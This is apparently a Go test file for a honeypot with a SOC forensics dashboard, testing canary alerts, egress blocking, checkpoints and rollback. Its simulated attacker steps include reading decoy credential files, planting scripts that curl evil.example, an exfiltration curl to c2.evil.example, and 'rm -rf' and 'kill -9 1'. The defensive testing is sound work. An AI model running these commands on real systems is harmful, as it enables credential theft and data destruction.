// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestHoneypotRootfsDropAndForensicTrail(t *testing.T) {
	hp, err := newHoneypot(t.TempDir())
	if err != nil {
		t.Fatalf("newHoneypot: %v", err)
	}

	resp, err := hp.Interact("backdoor.sh", "#!/bin/sh\necho pwned", "echo hello_gvisor", "10.0.0.12")
	if err != nil {
		t.Fatalf("Interact: %v", err)
	}

	files := resp["files_in_rootfs_tmp"].(map[string]string)
	if files["backdoor.sh"] != "#!/bin/sh\necho pwned" {
		t.Fatalf("expected backdoor.sh in rootfs tmp, got %v", files)
	}
	if _, ok := files["payroll_db_credentials.env.bak"]; !ok {
		t.Fatalf("expected decoy credentials file to exist")
	}
	if _, ok := files["wire_transfer_batch_409.csv"]; !ok {
		t.Fatalf("expected decoy wire transfer file to exist")
	}

	stdout, _ := resp["stdout"].(string)
	if !strings.Contains(stdout, "hello_gvisor") {
		t.Fatalf("expected real shell stdout 'hello_gvisor', got %q", stdout)
	}

	events := resp["forensic_audit_trail"].([]ForensicEvent)
	if len(events) != 2 {
		t.Fatalf("expected 2 forensic events, got %d", len(events))
	}

	// Verify explicit /tmp/honeypot paths in commands map cleanly when ScratchDir is a temp dir (--mode=local)
	shellAbs, err := hp.InteractShell("", "", "pwd && cat /tmp/honeypot/payroll_db_credentials.env.bak", "10.0.0.12")
	if err != nil {
		t.Fatalf("InteractShell with /tmp/honeypot path: %v", err)
	}
	if shellAbs.ExitCode != 0 || !strings.Contains(shellAbs.Stdout, "Summer2026!Decoy") || !strings.Contains(shellAbs.Stdout, "/tmp/honeypot") {
		t.Fatalf("expected /tmp/honeypot path mapping in local temp dir, got code=%d stdout=%q stderr=%q", shellAbs.ExitCode, shellAbs.Stdout, shellAbs.Stderr)
	}
}

func TestHoneypotShellVsForensicsSeparationAndRootfsDelta(t *testing.T) {
	hp, err := newHoneypot(t.TempDir())
	if err != nil {
		t.Fatalf("newHoneypot: %v", err)
	}
	mux := newMux(hp)

	// 1. Attacker hits /shell to exfiltrate credentials and plant rootkit.sh
	req1 := httptest.NewRequest(http.MethodGet, "/shell?cmd=cat+payroll_db_credentials.env.bak+%26%26+printf+'%23!/bin/sh%0Acurl+evil.example/beacon%0A'+>+rootkit.sh+%26%26+chmod+%2Bx+rootkit.sh", nil)
	rec1 := httptest.NewRecorder()
	mux.ServeHTTP(rec1, req1)
	if rec1.Code != http.StatusOK {
		t.Fatalf("GET /shell status = %d, body = %s", rec1.Code, rec1.Body.String())
	}

	bodyStr := rec1.Body.String()
	if strings.Contains(strings.ToLower(bodyStr), "honeypot") || strings.Contains(bodyStr, "forensic_audit_trail") {
		t.Fatalf("/shell leaked honeypot/forensic indicators to attacker: %s", bodyStr)
	}

	var shellResp AttackerShellResponse
	if err := json.Unmarshal(rec1.Body.Bytes(), &shellResp); err != nil {
		t.Fatalf("unmarshal /shell: %v", err)
	}
	if !strings.Contains(shellResp.Stdout, "Summer2026!Decoy") {
		t.Fatalf("expected decoy password in stdout, got %q", shellResp.Stdout)
	}

	// 2. SOC queries /forensics and sees ADDED rootkit.sh + CRITICAL Canary alert
	req2 := httptest.NewRequest(http.MethodGet, "/forensics", nil)
	rec2 := httptest.NewRecorder()
	mux.ServeHTTP(rec2, req2)
	if rec2.Code != http.StatusOK {
		t.Fatalf("GET /forensics status = %d", rec2.Code)
	}

	var forensics1 ForensicsResponse
	if err := json.Unmarshal(rec2.Body.Bytes(), &forensics1); err != nil {
		t.Fatalf("unmarshal /forensics: %v", err)
	}
	if len(forensics1.CanaryAlerts) < 2 {
		t.Fatalf("expected at least 2 canary alerts (cred exfil + payload planted), got %+v", forensics1.CanaryAlerts)
	}

	foundAdded := false
	for _, d := range forensics1.RootfsDelta {
		if d.Name == "rootkit.sh" && d.Status == "ADDED" {
			foundAdded = true
		}
	}
	if !foundAdded {
		t.Fatalf("expected rootkit.sh with status ADDED in rootfs_delta, got %+v", forensics1.RootfsDelta)
	}

	// 3. Attacker wipes tracks (rm -f rootkit.sh) -> /forensics reports rootkit.sh as DELETED
	req3 := httptest.NewRequest(http.MethodGet, "/shell?cmd=rm+-f+rootkit.sh", nil)
	rec3 := httptest.NewRecorder()
	mux.ServeHTTP(rec3, req3)

	req4 := httptest.NewRequest(http.MethodGet, "/forensics", nil)
	rec4 := httptest.NewRecorder()
	mux.ServeHTTP(rec4, req4)

	var forensics2 ForensicsResponse
	if err := json.Unmarshal(rec4.Body.Bytes(), &forensics2); err != nil {
		t.Fatalf("unmarshal /forensics after rm: %v", err)
	}
	foundDeleted := false
	for _, d := range forensics2.RootfsDelta {
		if d.Name == "rootkit.sh" && d.Status == "DELETED" {
			foundDeleted = true
		}
	}
	if !foundDeleted {
		t.Fatalf("expected rootkit.sh with status DELETED after rm -f, got %+v", forensics2.RootfsDelta)
	}
}

func TestHoneypotBackendLifecycleRevertAndClone(t *testing.T) {
	ctx := context.Background()
	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")

	actorA := "honeypot-203-0-113-5"
	if err := backend.EnsureActor(ctx, actorA); err != nil {
		t.Fatalf("EnsureActor: %v", err)
	}

	// Plant rootkit.sh and save snapshot v2
	_, forensics, err := backend.ExecShell(ctx, actorA, "printf '#!/bin/sh\necho beacon\n' > rootkit.sh && chmod +x rootkit.sh", "", "")
	if err != nil {
		t.Fatalf("ExecShell plant: %v", err)
	}
	if _, ok := forensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected rootkit.sh on disk after plant")
	}

	ver, err := backend.SaveActor(ctx, actorA, "Auto-Checkpoint: rootkit.sh planted")
	if err != nil {
		t.Fatalf("SaveActor: %v", err)
	}
	if ver < 2 {
		t.Fatalf("expected snapshot version >= 2, got %d", ver)
	}

	// Clone actorA into honeypot-forensic-lab before wipe
	clonedForensics, err := backend.CloneActor(ctx, actorA, "honeypot-forensic-lab", "tag-forensic-203")
	if err != nil {
		t.Fatalf("CloneActor: %v", err)
	}
	if _, ok := clonedForensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected cloned forensic lab actor to contain rootkit.sh")
	}

	// Attacker wipes rootkit.sh on actorA
	_, wipedForensics, err := backend.ExecShell(ctx, actorA, "rm -f rootkit.sh", "", "")
	if err != nil {
		t.Fatalf("ExecShell wipe: %v", err)
	}
	if _, ok := wipedForensics.FilesInRootfsTmp["rootkit.sh"]; ok {
		t.Fatalf("expected rootkit.sh to be deleted after rm -f")
	}

	// Revert actorA back to saved checkpoint -> rootkit.sh is restored!
	revertedForensics, err := backend.RevertActor(ctx, actorA, ver)
	if err != nil {
		t.Fatalf("RevertActor: %v", err)
	}
	if _, ok := revertedForensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected rootkit.sh to be restored after RevertActor, got %v", revertedForensics.FilesInRootfsTmp)
	}

	// Suspend actorA and wake it up via ExecShell -> verify worker pod IP migration
	if err := backend.SuspendActor(ctx, actorA); err != nil {
		t.Fatalf("SuspendActor: %v", err)
	}
	_, migratedForensics, err := backend.ExecShell(ctx, actorA, "ls -la", "", "")
	if err != nil {
		t.Fatalf("ExecShell after suspend: %v", err)
	}
	if len(migratedForensics.PodIPHistory) < 2 {
		t.Fatalf("expected PodIPHistory length >= 2 after suspend + wakeup migration, got %v", migratedForensics.PodIPHistory)
	}
}

func TestHoneypotGatewayAutoCheckpointRevertAndClone(t *testing.T) {
	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")
	gw := NewGatewayServer(backend)
	srv := httptest.NewServer(gw.Mux())
	defer srv.Close()

	// 1. Verify GET / returns Split-Screen Truman Show HTML UI
	respUI, err := http.Get(srv.URL + "/")
	if err != nil {
		t.Fatalf("GET /: %v", err)
	}
	defer respUI.Body.Close()
	if respUI.StatusCode != http.StatusOK {
		t.Fatalf("GET / status = %d", respUI.StatusCode)
	}

	// 2. Plant rootkit.sh via /api/attacker/exec -> triggers Auto-Checkpoint!
	execBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"printf '#!/bin/sh\ncurl -s https://evil.example/beacon\n' > rootkit.sh && chmod +x rootkit.sh && ls -la"}`
	respExec, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(execBody))
	if err != nil {
		t.Fatalf("POST /api/attacker/exec: %v", err)
	}
	defer respExec.Body.Close()
	var execResult GatewayActionResponse
	if err := json.NewDecoder(respExec.Body).Decode(&execResult); err != nil {
		t.Fatalf("decode execResult: %v", err)
	}
	if !execResult.AutoCheckpointed || execResult.SnapshotVersion < 2 {
		t.Fatalf("expected AutoCheckpointed=true and SnapshotVersion>=2, got %+v", execResult)
	}
	savedVer := execResult.SnapshotVersion

	// 3. Attacker runs rm -f rootkit.sh -> should NOT overwrite the pre-wipe checkpoint
	wipeBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"rm -f rootkit.sh"}`
	respWipe, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(wipeBody))
	if err != nil {
		t.Fatalf("POST /api/attacker/exec wipe: %v", err)
	}
	defer respWipe.Body.Close()
	var wipeResult GatewayActionResponse
	if err := json.NewDecoder(respWipe.Body).Decode(&wipeResult); err != nil {
		t.Fatalf("decode wipeResult: %v", err)
	}
	if wipeResult.AutoCheckpointed {
		t.Fatalf("expected AutoCheckpointed=false on destructive rm command")
	}

	// 4. SOC calls /api/soc/revert to undo rm -f and recover rootkit.sh
	revertBody := `{"actor_name":"honeypot-203-0-113-5","target_version":` + strings.TrimSpace(jsonNumber(savedVer)) + `}`
	respRev, err := http.Post(srv.URL+"/api/soc/revert", "application/json", strings.NewReader(revertBody))
	if err != nil {
		t.Fatalf("POST /api/soc/revert: %v", err)
	}
	defer respRev.Body.Close()
	var revResult GatewayActionResponse
	if err := json.NewDecoder(respRev.Body).Decode(&revResult); err != nil {
		t.Fatalf("decode revResult: %v", err)
	}
	if _, ok := revResult.Forensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected rootkit.sh restored after /api/soc/revert, got %v", revResult.Forensics.FilesInRootfsTmp)
	}

	// 5. SOC calls /api/soc/clone to fork honeypot-forensic-lab
	cloneBody := `{"source_actor":"honeypot-203-0-113-5","new_actor":"honeypot-forensic-lab"}`
	respClone, err := http.Post(srv.URL+"/api/soc/clone", "application/json", strings.NewReader(cloneBody))
	if err != nil {
		t.Fatalf("POST /api/soc/clone: %v", err)
	}
	defer respClone.Body.Close()
	var cloneResult GatewayActionResponse
	if err := json.NewDecoder(respClone.Body).Decode(&cloneResult); err != nil {
		t.Fatalf("decode cloneResult: %v", err)
	}
	if _, ok := cloneResult.Forensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected rootkit.sh in cloned forensic lab actor")
	}

	// 6. Verify mutating /api/soc/* endpoints reject GET (405) and malformed JSON (400)
	for _, ep := range []string{"/api/soc/save", "/api/soc/suspend", "/api/soc/revert", "/api/soc/clone", "/api/soc/reset"} {
		respGet, err := http.Get(srv.URL + ep)
		if err != nil {
			t.Fatalf("GET %s: %v", ep, err)
		}
		respGet.Body.Close()
		if respGet.StatusCode != http.StatusMethodNotAllowed {
			t.Fatalf("GET %s status = %d, want %d", ep, respGet.StatusCode, http.StatusMethodNotAllowed)
		}
	}
	respBadJSON, err := http.Post(srv.URL+"/api/soc/save", "application/json", strings.NewReader("{bad"))
	if err != nil {
		t.Fatalf("POST /api/soc/save bad JSON: %v", err)
	}
	respBadJSON.Body.Close()
	if respBadJSON.StatusCode != http.StatusBadRequest {
		t.Fatalf("POST /api/soc/save bad JSON status = %d, want %d", respBadJSON.StatusCode, http.StatusBadRequest)
	}
}

func TestHoneypotGatewayNoRunawayAutoCheckpointsAndReset(t *testing.T) {
	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")
	gw := NewGatewayServer(backend)
	srv := httptest.NewServer(gw.Mux())
	defer srv.Close()

	// 1. Exfiltrating decoy credentials triggers one auto-checkpoint (v2)
	exfilBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"cat payroll_db_credentials.env.bak"}`
	respExfil, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(exfilBody))
	if err != nil {
		t.Fatalf("POST exfil: %v", err)
	}
	defer respExfil.Body.Close()
	var exfilRes GatewayActionResponse
	if err := json.NewDecoder(respExfil.Body).Decode(&exfilRes); err != nil {
		t.Fatalf("decode exfilRes: %v", err)
	}
	if !exfilRes.AutoCheckpointed || exfilRes.SnapshotVersion != 2 {
		t.Fatalf("expected exfil to auto-checkpoint v2, got AutoCheckpointed=%v ver=%d", exfilRes.AutoCheckpointed, exfilRes.SnapshotVersion)
	}

	// 2. Subsequent harmless recon command (ls -la) must NOT spam another checkpoint!
	lsBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"ls -la"}`
	respLs, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(lsBody))
	if err != nil {
		t.Fatalf("POST ls: %v", err)
	}
	defer respLs.Body.Close()
	var lsRes GatewayActionResponse
	if err := json.NewDecoder(respLs.Body).Decode(&lsRes); err != nil {
		t.Fatalf("decode lsRes: %v", err)
	}
	if lsRes.AutoCheckpointed || lsRes.SnapshotVersion != 2 {
		t.Fatalf("expected harmless ls NOT to auto-checkpoint, got AutoCheckpointed=%v ver=%d", lsRes.AutoCheckpointed, lsRes.SnapshotVersion)
	}

	// 3. Planting rootkit.sh triggers v3, and another harmless command stays at v3
	plantBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"printf '#!/bin/sh\necho hi\n' > rootkit.sh"}`
	respPlant, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(plantBody))
	if err != nil {
		t.Fatalf("POST plant: %v", err)
	}
	defer respPlant.Body.Close()
	var plantRes GatewayActionResponse
	if err := json.NewDecoder(respPlant.Body).Decode(&plantRes); err != nil {
		t.Fatalf("decode plantRes: %v", err)
	}
	if !plantRes.AutoCheckpointed || plantRes.SnapshotVersion != 3 {
		t.Fatalf("expected plant to auto-checkpoint v3, got AutoCheckpointed=%v ver=%d", plantRes.AutoCheckpointed, plantRes.SnapshotVersion)
	}

	respId, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(`{"actor_name":"honeypot-203-0-113-5","cmd":"id"}`))
	if err != nil {
		t.Fatalf("POST id: %v", err)
	}
	defer respId.Body.Close()
	var idRes GatewayActionResponse
	if err := json.NewDecoder(respId.Body).Decode(&idRes); err != nil {
		t.Fatalf("decode idRes: %v", err)
	}
	if idRes.AutoCheckpointed || idRes.SnapshotVersion != 3 {
		t.Fatalf("expected harmless id after plant NOT to auto-checkpoint, got AutoCheckpointed=%v ver=%d", idRes.AutoCheckpointed, idRes.SnapshotVersion)
	}

	// 4. Clone honeypot-forensic-lab, then reset single actor (scope="actor")
	respClone, err := http.Post(srv.URL+"/api/soc/clone", "application/json", strings.NewReader(`{"source_actor":"honeypot-203-0-113-5","new_actor":"honeypot-forensic-lab"}`))
	if err != nil {
		t.Fatalf("POST clone: %v", err)
	}
	respClone.Body.Close()

	respResetActor, err := http.Post(srv.URL+"/api/soc/reset", "application/json", strings.NewReader(`{"actor_name":"honeypot-203-0-113-5","scope":"actor"}`))
	if err != nil {
		t.Fatalf("POST /api/soc/reset actor: %v", err)
	}
	defer respResetActor.Body.Close()
	var resetActorRes GatewayActionResponse
	if err := json.NewDecoder(respResetActor.Body).Decode(&resetActorRes); err != nil {
		t.Fatalf("decode resetActorRes: %v", err)
	}
	if resetActorRes.SnapshotVersion != 1 {
		t.Fatalf("expected SnapshotVersion=1 after actor reset, got %d", resetActorRes.SnapshotVersion)
	}
	if len(resetActorRes.Forensics.ForensicAuditTrail) != 0 || len(resetActorRes.Forensics.CanaryAlerts) != 0 {
		t.Fatalf("expected empty audit trail and canary alerts after actor reset, got %+v", resetActorRes.Forensics)
	}
	if _, ok := resetActorRes.Forensics.FilesInRootfsTmp["rootkit.sh"]; ok {
		t.Fatalf("expected rootkit.sh removed after actor reset")
	}
	if len(resetActorRes.Actors) != 3 {
		t.Fatalf("expected forensic clone to remain on single-actor reset (3 actors), got %d", len(resetActorRes.Actors))
	}

	// 5. Full stage reset (scope="stage") purges forensic clones and resets default actors
	respResetStage, err := http.Post(srv.URL+"/api/soc/reset", "application/json", strings.NewReader(`{"scope":"stage"}`))
	if err != nil {
		t.Fatalf("POST /api/soc/reset stage: %v", err)
	}
	defer respResetStage.Body.Close()
	var resetStageRes GatewayActionResponse
	if err := json.NewDecoder(respResetStage.Body).Decode(&resetStageRes); err != nil {
		t.Fatalf("decode resetStageRes: %v", err)
	}
	if resetStageRes.ActorName != "honeypot-203-0-113-5" || resetStageRes.SnapshotVersion != 1 {
		t.Fatalf("expected clean primary actor at v1 after stage reset, got %+v", resetStageRes)
	}
	if len(resetStageRes.Actors) != 2 {
		t.Fatalf("expected 2 baseline actors after stage reset, got %d", len(resetStageRes.Actors))
	}

	// 6. Reject invalid actor names (400 Bad Request)
	respBadActor, err := http.Post(srv.URL+"/api/soc/reset", "application/json", strings.NewReader(`{"actor_name":"--flag-injection","scope":"actor"}`))
	if err != nil {
		t.Fatalf("POST /api/soc/reset bad actor: %v", err)
	}
	respBadActor.Body.Close()
	if respBadActor.StatusCode != http.StatusBadRequest {
		t.Fatalf("expected 400 Bad Request on invalid actor name, got %d", respBadActor.StatusCode)
	}
}

func jsonNumber(n int) string {
	b, _ := json.Marshal(n)
	return string(b)
}

func TestHoneypotShellPersistentCwdEnvAndSubdirectories(t *testing.T) {
	hp, err := newHoneypot(t.TempDir())
	if err != nil {
		t.Fatalf("newHoneypot: %v", err)
	}

	// 1. mkdir loot && cd loot -> verify Cwd persists on the next separate command!
	if _, err := hp.InteractShell("", "", "mkdir loot", "10.0.0.15"); err != nil {
		t.Fatalf("mkdir loot: %v", err)
	}
	cdResp, err := hp.InteractShell("", "", "cd loot", "10.0.0.15")
	if err != nil {
		t.Fatalf("cd loot: %v", err)
	}
	if cdResp.Cwd != "/var/www/payroll-admin/workspace/loot" {
		t.Fatalf("expected deceptive Cwd=/var/www/payroll-admin/workspace/loot after cd, got %q", cdResp.Cwd)
	}

	pwdResp, err := hp.InteractShell("", "", "pwd", "10.0.0.15")
	if err != nil {
		t.Fatalf("pwd after cd: %v", err)
	}
	if strings.TrimSpace(pwdResp.Stdout) != "/tmp/honeypot/loot" {
		t.Fatalf("expected pwd=/tmp/honeypot/loot across turns, got %q", pwdResp.Stdout)
	}

	// 2. export VAR across separate commands + drop file inside subdirectory
	if _, err := hp.InteractShell("", "", "export EXFIL_KEY=hunter2", "10.0.0.15"); err != nil {
		t.Fatalf("export EXFIL_KEY: %v", err)
	}
	envResp, err := hp.InteractShell("", "", "printf '%s' \"$EXFIL_KEY\" > stage2.txt && cat stage2.txt", "10.0.0.15")
	if err != nil {
		t.Fatalf("use EXFIL_KEY in subdir: %v", err)
	}
	if envResp.Stdout != "hunter2" {
		t.Fatalf("expected EXFIL_KEY=hunter2 persisted across turns, got %q", envResp.Stdout)
	}

	// 3. Verify recursive ForensicsResponse sees loot/ and loot/stage2.txt + CurrentWorkingDir
	fSnap := hp.SnapshotForensics("10.0.0.15")
	if fSnap.CurrentWorkingDir != "/tmp/honeypot/loot" {
		t.Fatalf("expected CurrentWorkingDir=/tmp/honeypot/loot, got %q", fSnap.CurrentWorkingDir)
	}
	if fSnap.FilesInRootfsTmp["loot/stage2.txt"] != "hunter2" {
		t.Fatalf("expected loot/stage2.txt in FilesInRootfsTmp, got %v", fSnap.FilesInRootfsTmp)
	}

	// 4. Save checkpoint v2 inside loot/, then cd .. && rm -rf loot, then RestoreCheckpoint(2)
	cp := hp.SaveCheckpoint(2, "Subdir payload planted")
	if cp.Version != 2 {
		t.Fatalf("expected checkpoint v2, got %d", cp.Version)
	}
	if _, err := hp.InteractShell("", "", "cd .. && rm -rf loot", "10.0.0.15"); err != nil {
		t.Fatalf("cd .. && rm -rf loot: %v", err)
	}
	fWiped := hp.SnapshotForensics("10.0.0.15")
	if fWiped.CurrentWorkingDir != "/tmp/honeypot" {
		t.Fatalf("expected CurrentWorkingDir=/tmp/honeypot after cd .., got %q", fWiped.CurrentWorkingDir)
	}
	if _, exists := fWiped.FilesInRootfsTmp["loot/stage2.txt"]; exists {
		t.Fatalf("expected loot/stage2.txt deleted after rm -rf")
	}

	fRestored, err := hp.RestoreCheckpoint(2, "10.0.0.15")
	if err != nil {
		t.Fatalf("RestoreCheckpoint(2): %v", err)
	}
	if fRestored.CurrentWorkingDir != "/tmp/honeypot/loot" {
		t.Fatalf("expected CurrentWorkingDir restored to /tmp/honeypot/loot, got %q", fRestored.CurrentWorkingDir)
	}
	if fRestored.FilesInRootfsTmp["loot/stage2.txt"] != "hunter2" {
		t.Fatalf("expected loot/stage2.txt restored after Revert, got %v", fRestored.FilesInRootfsTmp)
	}

	// 5. Verify unclosed quote syntax error exits cleanly (exit != 0) without breaking subsequent turns
	badSyntax, err := hp.InteractShell("", "", "echo \"unclosed", "10.0.0.15")
	if err != nil {
		t.Fatalf("InteractShell bad syntax: %v", err)
	}
	if badSyntax.ExitCode == 0 {
		t.Fatalf("expected non-zero exit code on unclosed quote")
	}
	afterSyntax, err := hp.InteractShell("", "", "pwd", "10.0.0.15")
	if err != nil || strings.TrimSpace(afterSyntax.Stdout) != "/tmp/honeypot/loot" {
		t.Fatalf("expected shell Cwd intact after syntax error, got err=%v stdout=%q", err, afterSyntax.Stdout)
	}
}

func TestHoneypotGatewayOneWayMirrorUIDesign(t *testing.T) {
	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")
	gw := NewGatewayServer(backend)
	srv := httptest.NewServer(gw.Mux())
	defer srv.Close()

	resp, err := http.Get(srv.URL + "/")
	if err != nil {
		t.Fatalf("GET /: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("GET / status = %d, want 200", resp.StatusCode)
	}
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read body: %v", err)
	}
	html := string(raw)

	requiredMarkers := []string{
		`id="movieSetPane"`,
		`id="oneWayMirror"`,
		`id="socBoothPane"`,
		`https://staging-admin.acmecorp.internal/admin/debug`,
		`id="actorTabs"`,
		`id="attackerTargetLabel"`,
		`id="terminalOutput"`,
		`id="terminalHistory"`,
		`id="terminalPromptLine"`,
		`id="customCmdInput"`,
		`class="terminal-inline-input"`,
		`handleTermKeydown(event)`,
		`focusTermInput(event)`,
		`id="checkpointToast"`,
		`id="socActorState"`,
		`id="socKernelProof"`,
		`id="socPodTrail"`,
		`id="socPodHopCount"`,
		`id="socSnapVer"`,
		`id="snapshotTimeline"`,
		`id="canaryBanner"`,
		`id="deltaTableBody"`,
		`id="payloadInspector"`,
		`id="inspectorFileTitle"`,
		`id="inspectorFileBody"`,
		`id="auditTrailBox"`,
		`socSave()`,
		`socSuspend()`,
		`socRevert()`,
		`socClone()`,
		`socResetActor()`,
		`socResetStage()`,
		`data-director="closed"`,
		`id="directorToggleBtn"`,
		`toggleDirectorView()`,
		`id="directorAuditCount"`,
		`id="resetStageBtn"`,
		`id="resetActorBtn"`,
		`id="terminalQuickChips"`,
		`handleTabComplete(input)`,
		`KNOWN_SHELL_COMMANDS`,
		`completePathCandidates(`,
		`trimmed === "clear"`,
		`trimmed === "history"`,
		`[data-theme="light"]`,
		`id="themeToggleBtn"`,
		`id="themeSegDark"`,
		`id="themeSegLight"`,
		`toggleTheme()`,
	}
	for _, marker := range requiredMarkers {
		if !strings.Contains(html, marker) {
			t.Errorf("GET / HTML missing required marker %q", marker)
		}
	}

	if strings.Contains(html, `class="cmd-form"`) {
		t.Errorf("GET / HTML must not contain separate bottom .cmd-form text box; commands should be edited inline in #terminalOutput")
	}

	if strings.Contains(html, "themeToggleLabel") {
		t.Errorf("GET / HTML theme toggle must be icon-only without a text label that shifts layout")
	}

	if strings.Contains(html, ".innerHTML") {
		t.Errorf("GET / HTML script must use safe DOM APIs (textContent/replaceChildren/createElement) instead of .innerHTML")
	}
}

func TestHoneypotGatewayPresenterAuthAndGoogleGate(t *testing.T) {
	t.Setenv("ALLOWED_GOOGLE_DOMAINS", "google.com,event.goog")
	t.Setenv("GOOGLE_CLIENT_ID", "test-client-id.apps.googleusercontent.com")

	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")
	gw := NewGatewayServer(backend, "hp-secret-token")
	mux := gw.Mux()

	// 1. Unauthenticated / and /api/state return 401
	unauthRec := httptest.NewRecorder()
	mux.ServeHTTP(unauthRec, httptest.NewRequest(http.MethodGet, "/", nil))
	if unauthRec.Code != http.StatusUnauthorized || !strings.Contains(unauthRec.Body.String(), "Presenter Sign-In Required") {
		t.Fatalf("expected 401 Google Sign-In Gate on unauthenticated /, got %d", unauthRec.Code)
	}
	if !strings.Contains(unauthRec.Body.String(), "@google.com") || !strings.Contains(unauthRec.Body.String(), "@event.goog") {
		t.Fatalf("expected allowed Google domains in gate HTML")
	}

	unauthAPIRec := httptest.NewRecorder()
	mux.ServeHTTP(unauthAPIRec, httptest.NewRequest(http.MethodGet, "/api/state", nil))
	if unauthAPIRec.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401 on unauthenticated /api/state, got %d", unauthAPIRec.Code)
	}

	// 2. ?key= unlocks session cookie and redirects (303) to /
	unlockRec := httptest.NewRecorder()
	mux.ServeHTTP(unlockRec, httptest.NewRequest(http.MethodGet, "/?key=hp-secret-token", nil))
	if unlockRec.Code != http.StatusSeeOther || unlockRec.Header().Get("Location") != "/" {
		t.Fatalf("expected 303 redirect to /, got %d (%q)", unlockRec.Code, unlockRec.Header().Get("Location"))
	}
	cookies := unlockRec.Result().Cookies()
	if len(cookies) == 0 || cookies[0].Name != PresenterCookieName {
		t.Fatalf("expected %s cookie at cookies[0], got %+v", PresenterCookieName, cookies)
	}

	// 3. Cookie unlocks UI and X-Presenter-Key unlocks API
	uiReq := httptest.NewRequest(http.MethodGet, "/", nil)
	for _, c := range cookies {
		uiReq.AddCookie(c)
	}
	uiRec := httptest.NewRecorder()
	mux.ServeHTTP(uiRec, uiReq)
	if uiRec.Code != http.StatusOK {
		t.Fatalf("expected 200 OK with session cookie, got %d", uiRec.Code)
	}

	apiReq := httptest.NewRequest(http.MethodGet, "/api/state", nil)
	apiReq.Header.Set(PresenterHeaderName, "hp-secret-token")
	apiRec := httptest.NewRecorder()
	mux.ServeHTTP(apiRec, apiReq)
	if apiRec.Code != http.StatusOK {
		t.Fatalf("expected 200 OK on /api/state with X-Presenter-Key, got %d", apiRec.Code)
	}
}

func TestHoneypotEgressPolicyAndMITMSecretProof(t *testing.T) {
	ctx := context.Background()
	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")
	actor := "honeypot-203-0-113-5"

	shellResp, forensics, err := backend.ExecShell(ctx, actor, "env | grep PAYROLL_API_TOKEN && curl -sS --connect-timeout 2 https://c2.evil.example/exfil", "", "")
	if err != nil {
		t.Fatalf("ExecShell egress & MITM test: %v", err)
	}

	if !strings.Contains(shellResp.Stdout, "PAYROLL_API_TOKEN=ate-secret://k8s.io/default/anything-but-agents/payroll-vault-api/token") {
		t.Fatalf("expected PAYROLL_API_TOKEN ate-secret:// URI in stdout, got %q", shellResp.Stdout)
	}
	if !strings.Contains(shellResp.Stderr, "EgressPolicy 'default' denied outbound connection") {
		t.Fatalf("expected EgressPolicy block message in stderr, got %q", shellResp.Stderr)
	}
	if forensics.EgressSecurityProof.BlockedEgressAttempts < 1 {
		t.Fatalf("expected BlockedEgressAttempts >= 1, got %+v", forensics.EgressSecurityProof)
	}
	if forensics.EgressSecurityProof.CredentialInjectionURI != decoySecretURI {
		t.Fatalf("expected CredentialInjectionURI %q, got %q", decoySecretURI, forensics.EgressSecurityProof.CredentialInjectionURI)
	}

	hasSecretRule := false
	hasEgressRule := false
	for _, a := range forensics.CanaryAlerts {
		if a.Rule == "MITM_SECRET_PLACEHOLDER_OBSERVED" {
			hasSecretRule = true
		}
		if a.Rule == "EGRESS_POLICY_BLOCKED" {
			hasEgressRule = true
		}
	}
	if !hasSecretRule || !hasEgressRule {
		t.Fatalf("expected MITM_SECRET_PLACEHOLDER_OBSERVED and EGRESS_POLICY_BLOCKED canary alerts, got %+v", forensics.CanaryAlerts)
	}
}

func TestHoneypotCrashedStateRefusalAndRevertRecovery(t *testing.T) {
	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")
	gw := NewGatewayServer(backend)
	srv := httptest.NewServer(gw.Mux())
	defer srv.Close()

	// 1. Plant rootkit.sh -> auto-checkpoints v2
	plantBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"printf '#!/bin/sh\necho keepme\n' > rootkit.sh"}`
	respPlant, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(plantBody))
	if err != nil {
		t.Fatalf("POST plant: %v", err)
	}
	respPlant.Body.Close()

	// 2. Attacker executes 'kill -9 1' -> transitions actor to CRASHED (exit 137) without overwriting v2
	crashBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"kill -9 1"}`
	respCrash, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(crashBody))
	if err != nil {
		t.Fatalf("POST crash: %v", err)
	}
	defer respCrash.Body.Close()
